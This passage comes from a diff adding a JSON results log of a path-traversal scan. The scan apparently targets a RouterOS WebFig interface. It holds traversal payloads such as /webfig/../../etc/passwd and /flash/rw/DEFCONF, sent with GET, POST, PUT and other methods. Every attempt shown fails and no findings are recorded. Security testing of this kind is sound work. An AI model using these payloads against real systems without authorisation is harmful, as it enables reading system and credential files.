+        "direct_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "traversal_sigs": [],
+        "direct_sigs": [],
+        "traversal_success": false,
+        "direct_success": false
+      }
+    },
+    {
+      "id": 88,
+      "category": "routeros_paths",
+      "name": "ROS path: Linux kernel version",
+      "description": "Linux kernel version -- traversal=/webfig/../../../proc/version, direct=/proc/version",
+      "result": "Traversal: HTTP 404 (len=99), Direct: HTTP 404 (len=99), traversal_success=False, direct_success=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.569782",
+      "details": {
+        "traversal_path": "/webfig/../../../proc/version",
+        "direct_path": "/proc/version",
+        "traversal_status": 404,
+        "direct_status": 404,
+        "traversal_body_len": 99,
+        "direct_body_len": 99,
+        "traversal_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "direct_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "traversal_sigs": [],
+        "direct_sigs": [],
+        "traversal_success": false,
+        "direct_success": false
+      }
+    },
+    {
+      "id": 89,
+      "category": "routeros_paths",
+      "name": "ROS path: RouterOS default configuration",
+      "description": "RouterOS default configuration -- traversal=/webfig/../../../flash/rw/DEFCONF, direct=/flash/rw/DEFCONF",
+      "result": "Traversal: HTTP 404 (len=99), Direct: HTTP 404 (len=99), traversal_success=False, direct_success=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.577778",
+      "details": {
+        "traversal_path": "/webfig/../../../flash/rw/DEFCONF",
+        "direct_path": "/flash/rw/DEFCONF",
+        "traversal_status": 404,
+        "direct_status": 404,
+        "traversal_body_len": 99,
+        "direct_body_len": 99,
+        "traversal_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "direct_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "traversal_sigs": [],
+        "direct_sigs": [],
+        "traversal_success": false,
+        "direct_success": false
+      }
+    },
+    {
+      "id": 90,
+      "category": "routeros_paths",
+      "name": "ROS path: Direct root traversal (no prefix)",
+      "description": "Direct root traversal (no prefix) -- traversal=/../../../etc/passwd, direct=/etc/passwd",
+      "result": "Traversal: HTTP 404 (len=99), Direct: HTTP 404 (len=99), traversal_success=False, direct_success=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.589772",
+      "details": {
+        "traversal_path": "/../../../etc/passwd",
+        "direct_path": "/etc/passwd",
+        "traversal_status": 404,
+        "direct_status": 404,
+        "traversal_body_len": 99,
+        "direct_body_len": 99,
+        "traversal_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "direct_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "traversal_sigs": [],
+        "direct_sigs": [],
+        "traversal_success": false,
+        "direct_success": false
+      }
+    },
+    {
+      "id": 91,
+      "category": "method_traversal",
+      "name": "GET traversal",
+      "description": "GET /webfig/../../etc/passwd -- test traversal with GET method",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False, write_anomaly=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.597768",
+      "details": {
+        "method": "GET",
+        "path": "/webfig/../../etc/passwd",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false,
+        "write_anomaly": false
+      }
+    },
+    {
+      "id": 92,
+      "category": "method_traversal",
+      "name": "POST traversal",
+      "description": "POST /webfig/../../etc/passwd -- test traversal with POST method",
+      "result": "Status: HTTP/1.1 501 Not Implemented, body_len=111, traversal=False, write_anomaly=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.605764",
+      "details": {
+        "method": "POST",
+        "path": "/webfig/../../etc/passwd",
+        "status_line": "HTTP/1.1 501 Not Implemented",
+        "status_code": 501,
+        "body_len": 111,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false,
+        "write_anomaly": false
+      }
+    },
+    {
+      "id": 93,
+      "category": "method_traversal",
+      "name": "PUT traversal",
+      "description": "PUT /webfig/../../etc/passwd -- test traversal with PUT method",
+      "result": "Status: HTTP/1.1 501 Not Implemented, body_len=111, traversal=False, write_anomaly=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.609762",
+      "details": {
+        "method": "PUT",
+        "path": "/webfig/../../etc/passwd",
+        "status_line": "HTTP/1.1 501 Not Implemented",
+        "status_code": 501,
+        "body_len": 111,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false,
+        "write_anomaly": false
+      }
+    },
+    {
+      "id": 94,
+      "category": "method_traversal",
+      "name": "DELETE traversal",
+      "description": "DELETE /webfig/../../etc/passwd -- test traversal with DELETE method",
+      "result": "Status: HTTP/1.1 501 Not Implemented, body_len=111, traversal=False, write_anomaly=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.617758",
+      "details": {
+        "method": "DELETE",
+        "path": "/webfig/../../etc/passwd",
+        "status_line": "HTTP/1.1 501 Not Implemented",
+        "status_code": 501,
+        "body_len": 111,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false,
+        "write_anomaly": false
+      }
+    },
+    {
+      "id": 95,
+      "category": "method_traversal",
+      "name": "PATCH traversal",
+      "description": "PATCH /webfig/../../etc/passwd -- test traversal with PATCH method",
+      "result": "Status: HTTP/1.1 501 Not Implemented, body_len=111, traversal=False, write_anomaly=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.621756",
+      "details": {
+        "method": "PATCH",
+        "path": "/webfig/../../etc/passwd",
+        "status_line": "HTTP/1.1 501 Not Implemented",
+        "status_code": 501,
+        "body_len": 111,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false,
+        "write_anomaly": false
+      }
+    },
+    {
+      "id": 96,
+      "category": "method_traversal",
+      "name": "OPTIONS traversal",
+      "description": "OPTIONS /webfig/../../etc/passwd -- test traversal with OPTIONS method",
+      "result": "Status: HTTP/1.0 503 Service Unavailable, body_len=109, traversal=False, write_anomaly=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.621756",
+      "details": {
+        "method": "OPTIONS",
+        "path": "/webfig/../../etc/passwd",
+        "status_line": "HTTP/1.0 503 Service Unavailable",
+        "status_code": 503,
+        "body_len": 109,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 503 : unknown method</title>\n<h1>Error 503 : unknown method</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false,
+        "write_anomaly": false
+      }
+    },
+    {
+      "id": 97,
+      "category": "method_traversal",
+      "name": "HEAD traversal",
+      "description": "HEAD /webfig/../../etc/passwd -- test traversal with HEAD method",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=0, traversal=False, write_anomaly=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.625754",
+      "details": {
+        "method": "HEAD",
+        "path": "/webfig/../../etc/passwd",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 0,
+        "body_preview": "",
+        "matched_sigs": [],
+        "traversal_success": false,
+        "write_anomaly": false
+      }
+    },
+    {
+      "id": 98,
+      "category": "method_traversal",
+      "name": "TRACE traversal",
+      "description": "TRACE /webfig/../../etc/passwd -- test traversal with TRACE method",
+      "result": "Status: HTTP/1.0 503 Service Unavailable, body_len=109, traversal=False, write_anomaly=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.637748",
+      "details": {
+        "method": "TRACE",
+        "path": "/webfig/../../etc/passwd",
+        "status_line": "HTTP/1.0 503 Service Unavailable",
+        "status_code": 503,
+        "body_len": 109,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 503 : unknown method</title>\n<h1>Error 503 : unknown method</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false,
+        "write_anomaly": false
+      }
+    },
+    {
+      "id": 99,
+      "category": "method_traversal",
+      "name": "PROPFIND traversal",
+      "description": "PROPFIND /webfig/../../etc/passwd -- test traversal with PROPFIND method",
+      "result": "Status: HTTP/1.0 503 Service Unavailable, body_len=109, traversal=False, write_anomaly=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.641746",
+      "details": {
+        "method": "PROPFIND",
+        "path": "/webfig/../../etc/passwd",
+        "status_line": "HTTP/1.0 503 Service Unavailable",
+        "status_code": 503,
+        "body_len": 109,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 503 : unknown method</title>\n<h1>Error 503 : unknown method</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false,
+        "write_anomaly": false
+      }
+    },
+    {
+      "id": 100,
+      "category": "method_traversal",
+      "name": "MKCOL traversal",
+      "description": "MKCOL /webfig/../../etc/passwd -- test traversal with MKCOL method",
+      "result": "Status: HTTP/1.0 503 Service Unavailable, body_len=109, traversal=False, write_anomaly=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.645744",
+      "details": {
+        "method": "MKCOL",
+        "path": "/webfig/../../etc/passwd",
+        "status_line": "HTTP/1.0 503 Service Unavailable",
+        "status_code": 503,
+        "body_len": 109,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 503 : unknown method</title>\n<h1>Error 503 : unknown method</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false,
+        "write_anomaly": false
+      }
+    }
+  ],
+  "findings": []
+}
